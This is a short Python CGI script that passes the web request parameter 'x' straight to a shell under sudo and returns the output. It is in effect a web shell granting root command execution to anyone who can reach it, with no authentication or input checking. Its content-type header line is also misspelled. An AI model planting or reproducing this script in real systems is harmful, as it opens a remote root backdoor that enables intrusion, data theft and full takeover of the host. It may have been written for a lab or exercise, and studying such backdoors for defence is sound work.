#!/usr/bin/python3
import cgi
import subprocess

print("Conten-type: text/html")
print()
cmd=cgi.FieldStorage()
myx=cmd.getvalue('x')
output=subprocess.getoutput('sudo '+myx)

print(output)
